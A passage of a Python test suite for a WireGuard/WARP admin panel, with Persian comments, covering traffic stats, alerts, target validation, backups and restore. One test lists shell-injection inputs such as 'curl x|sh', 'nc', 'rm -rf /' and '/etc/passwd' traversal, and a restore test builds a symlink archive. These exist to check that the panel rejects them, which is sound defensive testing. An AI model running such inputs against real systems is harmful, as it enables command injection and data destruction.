        self.assertEqual(snap["top"][0]["net"], "216.239.32.0/24")
        self.assertEqual(snap["top"][1]["domains"], ["gemini.google.com"])


class WarpSplitBlindTests(unittest.TestCase):
    """کوریِ طبقه‌بندی (بی‌SNI/ECH): نمونه‌گیریِ دلتا در DB + سری + هشدار."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-test-")
        self.m = load_module(self.tmp)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _write_stats(self, **kw):
        m = self.m
        base = {"started": 111, "ai_bytes": 0, "direct_bytes": 0,
                "quic_ai_bytes": 0, "quic_direct_bytes": 0,
                "nosni_bytes": 0, "quic_nosni_bytes": 0, "ech_bytes": 0}
        base.update(kw)
        with open(m.WARP_SNI_STATS, "w", encoding="utf-8") as f:
            f.write(m.json.dumps(base))

    def test_sample_and_series_include_blind(self):
        m = self.m
        m.WARP_SNI_STATS = os.path.join(self.tmp, "sni.stats")
        import sqlite3 as sq
        con = sq.connect(m.DB_PATH)
        self._write_stats(ai_bytes=100, direct_bytes=300, nosni_bytes=40)
        m._warp_split_sample(con)          # اولین نمونه = کلِ مقدار
        self._write_stats(ai_bytes=150, direct_bytes=400, nosni_bytes=90,
                          quic_nosni_bytes=5, ech_bytes=10)
        m._warp_split_sample(con)          # دلتا
        con.close()
        ser = m.warp_split_series("24h")
        self.assertEqual(ser["total_ai"], 150)
        self.assertEqual(ser["total_direct"], 400)
        # «کوری» = فقط بی‌SNI: ۹۰ TCP + ۵ QUIC = ۹۵. ECH عمداً بیرون است —
        # اکستنشنش با GREASEِ کروم یکی است و نامِ واقعی آشکار می‌مانَد، پس
        # کوری نیست. تا ۴ اوت ۲۰۲۶ جمع می‌شد و همین نسبت را از ۲۴٫۶٪ به ۶۷٪
        # می‌برد و هشدارِ آستانه‌ی ۲۵٪ را دروغین شلیک می‌کرد.
        self.assertEqual(ser["total_blind"], 95)
        self.assertEqual(ser["blind_pct"], round(100 * 95 / 550))
        # ولی همچنان رصد می‌شود — جدا، با نامِ خودش
        self.assertEqual(ser["total_ech"], 10)
        self.assertEqual(ser["ech_pct"], round(100 * 10 / 550))
        self.assertTrue(all("blind" in p and "ech" in p for p in ser["points"]))

    def test_blind_share_alert_edges(self):
        m = self.m
        m.CONFIG["alerts"] = {"enabled": True}
        sent = []
        m.ALERTS.emit = lambda t: sent.append(t)
        m.ALERTS.state.clear()
        mon = m.AlertMonitor()
        mon.SLOW_EVERY = {}     # سنجش‌های گران در این تست هر بار اجرا شوند
        base = {"installed": True,
                "iface": {"up": True, "handshake_age": 20},
                "egress_actual": "wg22", "egress_want": "wg22",
                "account": "unlimited"}
        m.warp_status = lambda force=False: dict(base)
        m.warp_sni_enabled = lambda: True
        mb = 1024 * 1024
        # سهمِ کم → ثبتِ اولیه‌ی state (بی‌صدا)
        m.warp_split_series = lambda rng: {"points": [
            {"ai": 300 * mb, "direct": 300 * mb, "blind": 30 * mb}]}
        mon._check_warp()
        self.assertFalse(any("کور" in s for s in sent))
        # سهمِ بالای آستانه (۳۳٪ > ۲۵٪) → هشدار
        m.warp_split_series = lambda rng: {"points": [
            {"ai": 300 * mb, "direct": 300 * mb, "blind": 200 * mb}]}
        mon._check_warp()
        self.assertTrue(any("کور می‌شود" in s for s in sent))
        sent.clear()
        # حجمِ زیرِ حداقلِ معناداری → نه هشدار، نه تغییرِ state
        m.warp_split_series = lambda rng: {"points": [
            {"ai": 1 * mb, "direct": 1 * mb, "blind": 1 * mb}]}
        mon._check_warp()
        self.assertEqual(sent, [])
        # بازگشت به سهمِ عادی → پیامِ رفع
        m.warp_split_series = lambda rng: {"points": [
            {"ai": 300 * mb, "direct": 300 * mb, "blind": 10 * mb}]}
        mon._check_warp()
        self.assertTrue(any("عادی شد" in s for s in sent))


class WarpSrcNamesTests(unittest.TestCase):
    """نگاشتِ IPِ مبدأ → نامِ peer برای جدولِ «مصرفِ AI به تفکیکِ کاربر»."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-test-")
        self.m = load_module(self.tmp)
        with open(os.path.join(self.tmp, "wgtest.conf"), "w",
                  encoding="utf-8") as f:
            f.write(FIXTURE_CONF)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_names_from_wg_confs(self):
        names = self.m.warp_src_names()
        self.assertEqual(names.get("192.168.188.20"), "wgtest/user02")
        self.assertEqual(names.get("192.168.188.14"), "wgtest/user01")
        # AllowedIPsِ دوم (IPِ عمومیِ split-tunnel) هم نگاشت می‌شود
        self.assertEqual(names.get("149.154.166.110"), "wgtest/user02")

    def test_label_peer_pool_and_unknown(self):
        m = self.m
        names = {"192.168.188.20": "wgtest/user02"}
        self.assertEqual(m.warp_src_label("192.168.188.20", names),
                         "wgtest/user02")
        # استخرِ VPN دیگر پیش‌فرضِ سخت‌کد ندارد: نصبِ تازه استخرِ AnyConnect
        # ندارد، پس بدونِ WG_VPN_POOL برچسبی هم نباید بدهد.
        self.assertIsNone(m.WARP_POOL_NET,
                          "پیش‌فرض باید None باشد — رنجِ این استقرار نباید "
                          "داخلِ ایمیجِ Docker برود.")
        self.assertEqual(m.warp_src_label("192.168.70.5", names), "")
        # …و با ست‌شدنِ استخر، برچسبِ عمومی برمی‌گردد
        _saved = m.WARP_POOL_NET
        m.WARP_POOL_NET = m.ipaddress.ip_network("192.168.64.0/19")
        self.addCleanup(setattr, m, "WARP_POOL_NET", _saved)
        # کلیدِ کاتالوگ، نه متنِ فارسی — مرورگر/ربات به زبانِ خودشان ترجمه می‌کنند
        self.assertEqual(m.warp_src_label("192.168.70.5", names),
                         m.WARP_POOL_LABEL)
        self.assertEqual(m.t(m.WARP_POOL_LABEL, "en"), "VPN pool")
        # ناشناخته → خالی (نمایشِ IPِ خام)
        self.assertEqual(m.warp_src_label("192.168.188.99", names), "")
        # ورودیِ خراب نباید استثنا بدهد
        self.assertEqual(m.warp_src_label("not-an-ip", names), "")

    def test_names_cached(self):
        m = self.m
        first = m.warp_src_names()
        # فایلِ جدید داخلِ پنجره‌ی کش دیده نمی‌شود (کشِ ۶۰ثانیه‌ای)
        with open(os.path.join(self.tmp, "wgnew.conf"), "w",
                  encoding="utf-8") as f:
            f.write("#!!!userX\n[Peer]\nPublicKey = P=\n"
                    "AllowedIPs = 192.168.188.77/32\n")
        self.assertIs(m.warp_src_names(), first)
        m._WARP_SRC_NAMES["ts"] = 0            # انقضای کش
        self.assertEqual(m.warp_src_names().get("192.168.188.77"),
                         "wgnew/userX")


class DigestPersistTests(unittest.TestCase):
    """دایجست نباید بعد از restartِ پنل تکرار شود — تاریخِ آخرین ارسال
    باید روی دیسک بماند (کلاسِ باگِ حافظه‌ی در-RAM، مثلِ گاردِ ECMP)."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-test-")
        self.m = load_module(self.tmp)
        self.m.DIGEST_STATE = os.path.join(self.tmp, "digest.last")
        self.m.CONFIG["alerts"] = {
            "enabled": True, "bot_token": "x", "chat_id": "1",
            "digest_enabled": True, "digest_time": "00:00",
            "digest_weekly": False}
        self.m.build_digest_text = lambda: "digest"
        self.sent = []
        self.m.ALERTS.emit = lambda txt, html=False: self.sent.append(txt)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_sends_once_and_survives_restart(self):
        m = self.m
        mon = m.AlertMonitor()
        mon._check_digest()
        self.assertEqual(len(self.sent), 1)          # ارسالِ اولِ امروز
        self.assertTrue(os.path.exists(m.DIGEST_STATE))
        mon._check_digest()
        self.assertEqual(len(self.sent), 1)          # همان پروسه: تکرار نه
        # «restartِ پنل»: نمونه‌ی تازه با حافظه‌ی خالی — قبلاً اینجا دوباره
        # می‌فرستاد؛ حالا از فایل می‌فهمد امروز ارسال شده
        mon2 = m.AlertMonitor()
        mon2._check_digest()
        self.assertEqual(len(self.sent), 1)

    def test_stale_file_does_not_block(self):
        """فایلِ دیروز نباید ارسالِ امروز را مسدود کند."""
        m = self.m
        with open(m.DIGEST_STATE, "w") as f:
            f.write("2000-01-01\n")
        mon = m.AlertMonitor()
        mon._check_digest()
        self.assertEqual(len(self.sent), 1)
        with open(m.DIGEST_STATE, encoding="utf-8") as f:
            self.assertNotEqual(f.read().strip(), "2000-01-01")


class WarpTargetTests(unittest.TestCase):
    """مدیریتِ مقصدهای WARP از پنل — تمرکزِ اصلی روی **امنیت**، چون این
    تنها دروازهٔ ورودِ داده به فایلی است که اسکریپتِ rootی می‌خواندش."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-test-")
        self.m = load_module(self.tmp)
        self.m.WARP_TARGETS = os.path.join(self.tmp, "targets.conf")
        self.m.WARP_SYNC = os.path.join(self.tmp, "sync.sh")
        with open(self.m.WARP_SYNC, "w") as f:
            f.write("WARP_EP=162.159.192.1\nRESOLVER=2.2.2.2\n")
        # آدرس‌های سرور را ثابت کن تا تست قابلِ‌تکرار باشد
        # سرور آدرسِ .68 دارد؛ .69 همسایه در همان /29 است (آدرسِ سرورِ VPN)
        self.m.run = lambda cmd, timeout=20: (
            0, "1: lo inet 127.0.0.1/8\n2: eth0 inet %s/29\n" % SRV_IP, "")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_rejects_shell_injection(self):
        """هیچ کاراکترِ شل‌داری نباید از دروازه رد شود."""
        m = self.m
        prot = m.warp_protected_ips()
        evil = [
            "$(touch /tmp/pwned)", "evil.com; rm -rf /", "`id`",
            "a.com && curl x|sh", "a.com|nc x 1", "a.com\nb.com",
            "../../etc/passwd", "a.com'\"", "a.com>out", "a.com{}",
            "*.com", "a.com?", "a com", "$IFS",
        ]
        for e in evil:
            kind, val, err = m.warp_validate_target(e, prot)
            self.assertTrue(err, "باید رد شود: %r" % e)
            self.assertEqual(val, "")

    def test_rejects_dangerous_ranges(self):
        """رنجِ پهن/خصوصی/رزرو و هرچه آی‌پیِ حیاتی را در بر بگیرد → رد."""
        m = self.m
        prot = m.warp_protected_ips()
        for bad, why in (
                ("0.0.0.0/0", "کلِ اینترنت"),
                ("34.0.0.0/8", "کلِ Google Cloud"),
                ("8.0.0.0/9", "پهن‌تر از /12"),
                ("192.168.0.0/16", "خصوصی — کاربران را قطع می‌کند"),
                ("10.0.0.0/12", "خصوصی"),
                ("172.16.0.0/12", "خصوصی"),
                ("127.0.0.1", "لوپ‌بک"),
                ("169.254.1.1", "link-local"),
                ("224.0.0.1", "multicast"),
                ("162.159.192.1", "endpointِ وارپ → حلقه"),
                ("162.159.192.0/24", "شاملِ endpointِ وارپ → حلقه"),
                ("2.2.2.2", "resolverِ کاربران → مرگِ DNS"),
                (SRV_IP, "آدرسِ خودِ سرور → قطعِ SSH/پنل"),
                # رگرسیون: .69 آدرسِ سرورِ VPNِ کاربران است و در همان /29
                # می‌افتد؛ محافظت باید **سابنتی** باشد نه آدرسِ دقیق
                (SRV_NB, "همسایه در سابنتِ سرور → قطعِ VPN"),
                (SRV_NET, "کلِ سابنتِ سرور"),
                (SRV_SUPERNET, "شاملِ سابنتِ سرور")):
            kind, val, err = m.warp_validate_target(bad, prot)
            self.assertTrue(err, "باید رد شود (%s): %s" % (why, bad))

    def test_accepts_valid(self):
        m = self.m
        prot = m.warp_protected_ips()
        for good, kind in (("gemini.google.com", "domain"),
                           ("NoteBookLM.Google", "domain"),
                           ("sub.a-b.example.co.uk", "domain"),
                           ("1.2.3.4", "net"),
                           ("142.251.150.0/24", "net"),
                           ("172.217.0.0/16", "net"),
                           ("8.34.208.0/20", "net")):
            k, val, err = m.warp_validate_target(good, prot)
            self.assertEqual(err, "", "باید پذیرفته شود: %s (%s)" % (good, err))
            self.assertEqual(k, kind)
        # نرمال‌سازی: حروفِ بزرگ → کوچک، و IP تکی → /32
        self.assertEqual(m.warp_validate_target("GEMINI.Google.COM", prot)[1],
                         "gemini.google.com")
        self.assertEqual(m.warp_validate_target("1.2.3.4", prot)[1],
                         "1.2.3.4/32")

    def test_write_read_roundtrip_and_dedup(self):
        m = self.m
        ok, err = m.warp_targets_write(
            ["gemini.google.com", "1.2.3.4", "gemini.google.com"], "admin")
        self.assertTrue(ok, err)
        self.assertEqual(m.warp_targets_read(),
                         ["gemini.google.com", "1.2.3.4/32"])   # بدونِ تکرار
        # فایل فقط داده باشد — هیچ متاکاراکترِ شل بیرونِ کامنت‌ها
        text = pathlib.Path(m.WARP_TARGETS).read_text(encoding="utf-8")
        body = "\n".join(l for l in text.splitlines()
                         if not l.startswith("#"))
        for ch in ("$", "`", ";", "|", "&", "("):
            self.assertNotIn(ch, body)
        # ورودیِ بد باید کلِ نوشتن را رد کند (همه یا هیچ)
        ok2, err2 = m.warp_targets_write(["good.com", "$(evil)"], "admin")
        self.assertFalse(ok2)
        self.assertEqual(m.warp_targets_read(),
                         ["gemini.google.com", "1.2.3.4/32"])   # دست‌نخورده

    def test_write_refuses_empty(self):
        self.assertFalse(self.m.warp_targets_write([], "admin")[0])

    def test_read_ignores_comments(self):
        m = self.m
        with open(m.WARP_TARGETS, "w", encoding="utf-8") as f:
            f.write("# کامنت (با پرانتز)\n\ngemini.google.com\n"
                    "1.2.3.0/24   # دنباله\n")
        self.assertEqual(m.warp_targets_read(),
                         ["gemini.google.com", "1.2.3.0/24"])


class WarpLatencyTests(unittest.TestCase):
    """کیفیتِ مسیر: پارسِ TTFB، سری، رتبه‌بندیِ endpoint، و هشدارِ کندی."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-test-")
        self.m = load_module(self.tmp)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_curl_ttfb_parses_seconds_to_ms(self):
        m = self.m
        m.run = lambda cmd, timeout=16: (0, "0.532 200", "")
        ms, code = m._curl_ttfb("https://x/")
        self.assertEqual(ms, 532)
        self.assertEqual(code, "200")
        # شکست → (None, "")
        m.run = lambda cmd, timeout=16: (7, "", "")
        self.assertEqual(m._curl_ttfb("https://x/"), (None, ""))
        # خروجیِ ناقص → امن
        m.run = lambda cmd, timeout=16: (0, "garbage", "")
        self.assertEqual(m._curl_ttfb("https://x/"), (None, ""))

    def test_ttfb_interface_flag(self):
        m = self.m
        seen = {}
        m.run = lambda cmd, timeout=16: (seen.update(cmd=cmd) or (0, "0.1 200", ""))
        m._curl_ttfb("https://x/", iface="wgwarp")
        self.assertIn("--interface", seen["cmd"])
        self.assertIn("wgwarp", seen["cmd"])

    def test_record_and_series(self):
        m = self.m
        m.warp_latency_record(500, 120)
        m.warp_latency_record(700, None)
        m.warp_latency_record(None, 150)     # نمونه‌ی شکست‌خورده مجاز
        s = m.warp_latency_series()
        self.assertEqual(len(s["points"]), 3)
        self.assertEqual(s["warp_avg"], 600)   # (500+700)/2، None نادیده
        self.assertEqual(s["direct_avg"], 135) # (120+150)/2
        # ترتیب قدیم→جدید
        self.assertLessEqual(s["points"][0]["ts"], s["points"][-1]["ts"])

    def test_probe_run_captures_ttfb(self):
        m = self.m
        def fake(cmd, timeout=15):
            if "cdn-cgi/trace" in cmd[-1]:
                return 0, "warp=on\nloc=DE\ncolo=FRA\nip=1.2.3.4\n", ""
            if "--interface" in cmd:
                return 0, "0.800 200", ""      # WARP کند
            return 0, "0.200 200", ""          # عادی سریع
        m.run = fake
        out = m.warp_probe_run()
        self.assertEqual(out["gemini"], "200")
        self.assertEqual(out["warp_ttfb"], 800)
        self.assertEqual(out["direct_ttfb"], 200)
        self.assertEqual(out["trace"]["loc"], "DE")

    def test_rank_endpoints_sorts_and_marks(self):
        m = self.m
        rtts = {"162.159.192.1": 90.0, "162.159.192.2": None,
                "188.114.96.1": 30.0}
        m._ping_rtt = lambda ip, count=2, timeout=4: rtts.get(ip, 60.0)
        m.WARP_GUARD_STATE = os.path.join(self.tmp, "guard.state")
        with open(m.WARP_GUARD_STATE, "w") as f:
            f.write("egress=wg22\nrule=on\nendpoint=162.159.192.1\n")
        k = m.warp_rank_endpoints()
        eps = k["endpoints"]
        self.assertEqual(eps[0]["ip"], "188.114.96.1")   # کمترین RTT اول
        self.assertEqual(k["best"], "188.114.96.1")
        self.assertEqual(k["current"], "162.159.192.1")
        # نرسیده‌ها ته صف
        self.assertIsNone(eps[-1]["rtt"])
        # علامتِ current روی endpointِ فعلی
        self.assertTrue(next(e for e in eps
                             if e["ip"] == "162.159.192.1")["current"])

    def test_ping_rtt_parses_summary(self):
        m = self.m
        m.run = lambda cmd, timeout=12: (
            0, "rtt min/avg/max/mdev = 20.1/31.5/40.9/5.2 ms", "")
        self.assertEqual(m._ping_rtt("1.2.3.4"), 31.5)
        m.run = lambda cmd, timeout=12: (1, "", "")   # نرسید
        self.assertIsNone(m._ping_rtt("1.2.3.4"))

    def test_slow_path_alert_edges(self):
        m = self.m
        m.CONFIG["alerts"] = {"enabled": True}
        sent = []
        m.ALERTS.emit = lambda t: sent.append(t)
        m.ALERTS.state.clear()
        mon = m.AlertMonitor()
        base = {"installed": True,
                "iface": {"up": True, "handshake_age": 20},
                "egress_actual": "wg22", "egress_want": "wg22",
                "account": "unlimited"}
        m.warp_status = lambda force=False: dict(base)
        m.warp_sni_enabled = lambda: False
        # prime: اولین فراخوانیِ edge بی‌صداست (prev=None) — با حالتِ سریع
        m._WARP_PROBE["ts"] = 0
        m.warp_probe_run = lambda: {
            "ts": int(time.time()), "trace": {"warp": "on", "loc": "DE"},
            "gemini": "200", "warp_ttfb": 250, "direct_ttfb": 200}
        mon._check_warp()
        self.assertEqual(sent, [])
        # مسیرِ کند: WARP بالای آستانه و چند برابرِ عادی → هشدار
        m._WARP_PROBE["ts"] = 0
        m.warp_probe_run = lambda: {
            "ts": int(time.time()), "trace": {"warp": "on", "loc": "DE"},
            "gemini": "200", "warp_ttfb": 5000, "direct_ttfb": 300}
        mon._check_warp()
        self.assertTrue(any("کند" in s for s in sent))
        sent.clear()
        # بازگشت به سریع → پیامِ بازگشت
        m._WARP_PROBE["ts"] = 0
        m.warp_probe_run = lambda: {
            "ts": int(time.time()), "trace": {"warp": "on", "loc": "DE"},
            "gemini": "200", "warp_ttfb": 250, "direct_ttfb": 200}
        mon._check_warp()
        self.assertTrue(any("عادی برگشت" in s for s in sent))


class WarpEventTests(unittest.TestCase):
    """خطِ زمانیِ رویدادهای WARP: ثبت، ترتیب، کران، و ضدِخرابی."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-test-")
        self.m = load_module(self.tmp)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_record_and_read_newest_first(self):
        m = self.m
        m.warp_event("target_add", "gemini.google.com", "admin")
        m.warp_event("egress", "خروج → wg21", "WarpGuard")
        evs = m.warp_events_read(10)
        self.assertEqual(len(evs), 2)
        self.assertEqual(evs[0]["kind"], "egress")          # جدید اول
        self.assertEqual(evs[0]["label"], "سوییچِ تونلِ خروج")
        self.assertEqual(evs[1]["kind"], "target_add")
        self.assertEqual(evs[1]["actor"], "admin")

    def test_unknown_kind_label_falls_back(self):
        m = self.m
        m.warp_event("weird_kind", "x")
        self.assertEqual(m.warp_events_read(1)[0]["label"], "weird_kind")

    def test_bounded_to_max(self):
        m = self.m
        m.WARP_EVENT_MAX = 5
        for i in range(12):
            m.warp_event("rotate", "ep-%d" % i)
        evs = m.warp_events_read(50)
        self.assertEqual(len(evs), 5)                        # trim به سقف
        self.assertEqual(evs[0]["detail"], "ep-11")          # جدیدترین‌ها ماندند
        self.assertEqual(evs[-1]["detail"], "ep-7")

    def test_failure_is_swallowed(self):
        m = self.m
        m.DB_PATH = "/nonexistent-dir/xyz/traffic.db"        # نوشتن شکست بخورد
        try:
            m.warp_event("target_add", "a.com")              # نباید استثنا بدهد
        except Exception as e:
            self.fail("warp_event باید ضدِخرابی باشد: %r" % e)


class WarpPresetTests(unittest.TestCase):
    """کاتالوگِ سرویس‌های AI: وضعیتِ on/partial/off + افزودن/حذفِ مجموعه‌ای."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-test-")
        self.m = load_module(self.tmp)
        self.m.WARP_TARGETS = os.path.join(self.tmp, "targets.conf")
        self.m.WARP_SYNC = os.path.join(self.tmp, "sync.sh")
        with open(self.m.WARP_SYNC, "w") as f:
            f.write("WARP_EP=162.159.192.1\nRESOLVER=2.2.2.2\n")
        self.m.run = lambda cmd, timeout=20: (
            0, "1: lo inet 127.0.0.1/8\n2: eth0 inet %s/29\n" % SRV_IP, "")
        self.gem = next(p for p in self.m.WARP_AI_PRESETS
                        if p["id"] == "gemini")
        self.oai = next(p for p in self.m.WARP_AI_PRESETS
                        if p["id"] == "openai")
        with open(self.m.WARP_TARGETS, "w", encoding="utf-8") as f:
            f.write("\n".join(self.gem["domains"]) + "\n")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_all_catalog_domains_pass_validation(self):
        """هر دامنه‌ی کاتالوگ باید از سخت‌گیرترین دروازه (validate) رد شود —
        محافظ در برابرِ غلطِ تایپی در خودِ کاتالوگ."""
        m = self.m
        prot = m.warp_protected_ips()
        ids = set()
        for p in m.WARP_AI_PRESETS:
            self.assertNotIn(p["id"], ids)          # شناسه‌ی تکراری ممنوع
            ids.add(p["id"])
            self.assertTrue(p["domains"])
            for d in p["domains"]:
                kind, val, err = m.warp_validate_target(d, prot)
                self.assertEqual(err, "", "دامنه‌ی نامعتبر در کاتالوگ: %s (%s)"
                                 % (d, err))
                self.assertEqual(kind, "domain")
                self.assertEqual(val, d)            # از قبل نرمال‌شده باشد

    def test_status_on_partial_off(self):
        m = self.m
        st = {p["id"]: p for p in m.warp_presets_status()}
        self.assertEqual(st["gemini"]["state"], "on")
        self.assertEqual(st["openai"]["state"], "off")
        # یکی از دامنه‌های openai را دستی اضافه کن → partial
        cur = m.warp_targets_read()
        m.warp_targets_write(cur + [self.oai["domains"][0]], "t")
        st = {p["id"]: p for p in m.warp_presets_status()}
        self.assertEqual(st["openai"]["state"], "partial")
        self.assertEqual(st["openai"]["present"], 1)

    def test_enable_adds_all_missing_then_noop(self):
        m = self.m
        ok, msg, aok = m.warp_preset_apply("openai", True, "admin")
        self.assertTrue(ok, msg)
        cur = set(m.warp_targets_read())
        for d in self.oai["domains"]:
            self.assertIn(d, cur)
        st = {p["id"]: p for p in m.warp_presets_status()}
        self.assertEqual(st["openai"]["state"], "on")
        self.assertEqual(st["gemini"]["state"], "on")   # دست‌نخورده
        # بارِ دوم: همه از قبل هستند → بدونِ apply
        ok2, msg2, aok2 = m.warp_preset_apply("openai", True, "admin")
        self.assertTrue(ok2)
        self.assertFalse(aok2)
        self.assertEqual(msg2, "api.ok.warp.preset.all")

    def test_disable_removes_only_its_domains(self):
        m = self.m
        m.warp_preset_apply("openai", True, "admin")
        ok, msg, _a = m.warp_preset_apply("openai", False, "admin")
        self.assertTrue(ok, msg)
        cur = set(m.warp_targets_read())
        for d in self.oai["domains"]:
            self.assertNotIn(d, cur)
        for d in self.gem["domains"]:
            self.assertIn(d, cur)                       # gemini سالم ماند

    def test_disable_last_preset_refuses_empty_list(self):
        m = self.m
        # فقط دامنه‌های gemini در فهرست‌اند؛ حذفش فهرست را خالی می‌کند
        ok, msg, _a = m.warp_preset_apply("gemini", False, "admin")
        self.assertFalse(ok)
        self.assertEqual(msg, "api.err.warp.preset.empties")
        # فهرست دست‌نخورده مانده
        self.assertEqual(set(m.warp_targets_read()), set(self.gem["domains"]))

    def test_unknown_preset_rejected(self):
        ok, msg, _a = self.m.warp_preset_apply("nope", True, "admin")
        self.assertFalse(ok)


class ManualBackupTests(unittest.TestCase):
    """پشتیبان‌گیریِ دستی: زنجیرهٔ یونیت‌ها، قفلِ هم‌زمانی، مسیرِ شکست."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-test-")
        self.m = load_module(self.tmp)
        self.m.CONFIG["users"] = [{"username": "admin", "salt": "a" * 32,
                                   "hash": "h", "role": "admin", "totp": "",
                                   "stoken": "t"}]

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _wait_done(self):
        for _ in range(300):
            if not self.m.manual_backup_state()["running"]:
                return
            time.sleep(0.01)
        self.fail("worker تمام نشد")

    def test_panel_backup_runs_both_units_in_order(self):
        m = self.m
        calls = []
        m.run = lambda cmd, timeout=20: (calls.append(cmd) or (0, "", ""))
        m.ALERTS.event = lambda *a, **k: None
        ok, err = m.start_manual_backup("panel", "admin")
        self.assertTrue(ok, err)
        self._wait_done()
        # اول آرشیو، بعد آپلود — همان زنجیرهٔ شبانه
        self.assertEqual(calls, [
            ["systemctl", "start", "wg-panel-backup.service"],
            ["systemctl", "start", "wg-panel-s4-upload.service"]])
        st = m.manual_backup_state()
        self.assertEqual(st["result"], "ok")
        self.assertEqual(st["by"], "admin")

    def test_full_backup_single_unit_and_invalid_which(self):
        m = self.m
        calls = []
        m.run = lambda cmd, timeout=20: (calls.append(cmd) or (0, "", ""))
        m.ALERTS.event = lambda *a, **k: None
        ok, _ = m.start_manual_backup("full", "admin")
        self.assertTrue(ok)
        self._wait_done()
        # نامِ یونیت **مشتق** است نه سخت‌کد: پیش‌فرضِ خنثی + قابلِ ست با
        # WG_FULL_BACKUP_NAME. سنجشِ رشته‌ی ثابتِ قبلی، همان نامِ استقرار را
        # در تست زنده نگه می‌داشت و رگرسیونِ پارامتری‌سازی را نمی‌گرفت.
        self.assertEqual(calls,
                         [["systemctl", "start",
                           m.FULL_BACKUP_UNIT + ".service"]])
        self.assertEqual(m.FULL_BACKUP_UNIT, "wg-panel-full-backup",
                         "پیش‌فرض باید خنثی بماند — این رشته داخلِ ایمیجِ "
                         "Docker می‌رود که به سرورهای دیگر می‌رسد.")
        self.assertFalse(m.start_manual_backup("../etc", "admin")[0])
        self.assertFalse(m.start_manual_backup("", "admin")[0])

    def test_failure_stops_chain_and_alerts(self):
        """شکستِ مرحلهٔ اول: آپلود اجرا نشود، result=err و هشدارِ backup برود."""
        m = self.m
        calls, alerts = [], []
        m.run = lambda cmd, timeout=20: (calls.append(cmd) or (1, "", "boom"))
        m.ALERTS.event = lambda k, text: alerts.append(k)
        ok, _ = m.start_manual_backup("panel", "admin")
        self.assertTrue(ok)
        self._wait_done()
        self.assertEqual(len(calls), 1)          # زنجیره بعد از شکست ایستاد
        st = m.manual_backup_state()
        self.assertEqual(st["result"], "err")
        self.assertIn("boom", st["error"])
        self.assertEqual(alerts, ["backup"])

    def test_no_concurrent_runs(self):
        m = self.m
        import threading as th
        gate = th.Event()
        m.ALERTS.event = lambda *a, **k: None
        m.run = lambda cmd, timeout=20: (gate.wait(3) or (0, "", ""))
        ok, _ = m.start_manual_backup("panel", "admin")
        self.assertTrue(ok)
        ok2, err2 = m.start_manual_backup("full", "admin")   # هم‌زمان → رد
        self.assertFalse(ok2)
        # پیام حالا کلیدِ i18n است نه متنِ فارسی؛ به کد گره می‌خوریم تا
        # بازنویسیِ ترجمه این تست را نشکند.
        self.assertIn("api.err.bk.busy", err2)
        gate.set()
        self._wait_done()
        ok3, _ = m.start_manual_backup("full", "admin")      # بعد از پایان → ok
        self.assertTrue(ok3)
        self._wait_done()


class CloudRestoreTests(unittest.TestCase):
    """بازیابیِ ابری: نگاشتِ فرمتِ شبانه، whitelist سخت، sha256 و قفل."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-test-")
        self.m = load_module(self.tmp)
        self.m.BASE_DIR = self.tmp          # اسنپ‌شات/کلاینت‌ها ایزوله در tmp
        self.m.SAMPLER.refresh_meta = lambda: None
        self.m.CONFIG["users"] = [{"username": "admin", "salt": "a" * 32,
                                   "hash": "h", "role": "admin", "totp": "",
                                   "stoken": "t"}]

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    @staticmethod
    def _nightly_tar(files, link=None):
        """آرشیوِ ساختگی با ساختارِ واقعیِ شبانه (پیشوندِ ./ مثل tar -C)."""
        import io as _io
        import tarfile as _tf
        buf = _io.BytesIO()
        with _tf.open(fileobj=buf, mode="w:gz") as t:
            for nm, data in files.items():
                info = _tf.TarInfo("./" + nm)
                info.size = len(data)
                t.addfile(info, _io.BytesIO(data))
            if link:
                info = _tf.TarInfo(link)
                info.type = _tf.SYMTYPE
                info.linkname = "/etc/passwd"
                t.addfile(info)
        return buf.getvalue()

    @staticmethod
    def _db_bytes(marker="NEWDB"):
        """یک traffic.db ِ کوچکِ **واقعی**: بازیابی حالا integrity_check و
        وجودِ جدول‌ها را می‌سنجد، پس بایت‌های دلخواه دیگر رد می‌شوند."""
        import sqlite3 as _sq
        fd, path = tempfile.mkstemp(suffix=".db")
        os.close(fd)
        con = _sq.connect(path)
        con.execute("CREATE TABLE peer_meta(iface TEXT, name TEXT, note TEXT)")
        con.execute("CREATE TABLE usage_day(day TEXT)")
        con.execute("INSERT INTO peer_meta VALUES('wgtest','x',?)", (marker,))
        con.commit(); con.close()
        data = pathlib.Path(path).read_bytes()
        os.remove(path)
        return data

    def _full_files(self):
        return {
            "wireguard/wgtest.conf": b"[Interface]\nPrivateKey = FAKE=\n# NEW\n",
            "wg-panel/traffic.db": self._db_bytes(),
            "wg-panel/clients/wgtest/u1.conf": b"[Peer]\n",
            "wg-panel/config.json": b"{\"users\": []}",
            "wg-panel/wg_panel.py": b"print('evil')",
            "squid/squid.conf": b"http_port 3128\n",
        }

    def test_selective_restore_and_forbidden_files_skipped(self):
        m = self.m
        with open(os.path.join(self.tmp, "wgtest.conf"), "w") as f:
            f.write("OLD")
        db_before = pathlib.Path(m.DB_PATH).read_bytes()
        raw = self._nightly_tar(self._full_files())
        ok, msg = m.restore_from_nightly_tar(raw, ["wireguard"])
        self.assertTrue(ok, msg)
